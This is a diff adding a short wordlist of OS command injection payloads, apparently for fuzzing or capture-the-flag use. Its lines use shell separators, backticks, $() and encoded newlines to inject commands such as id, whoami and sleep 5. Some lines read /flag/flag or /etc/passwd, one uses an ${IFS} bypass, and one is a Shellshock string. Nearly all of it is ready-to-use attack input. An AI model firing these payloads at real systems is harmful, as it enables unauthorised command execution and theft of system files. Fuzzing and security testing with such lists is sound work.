@@ -1,0 +1,37 @@
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+%0aid
+%0a id
+%0d%0aid
+;id;
+|id|
+x;id
+x|id
+x$(id)
+x`id`
+127.0.0.1;id
+127.0.0.1|id
+127.0.0.1&&id
+127.0.0.1%0aid
+127.0.0.1$(id)
+;sleep 5
+|sleep 5
+$(sleep 5)
+`sleep 5`
+%0asleep 5
+;cat /flag/flag
+;cat${IFS}/flag/flag
+$(cat /flag/flag)
+%0acat /flag/flag
+/flag/*
+;cat /etc/passwd
+| cat /etc/passwd
+;ls -la /
+() { :;}; echo; /usr/bin/id
+& whoami
+| whoami
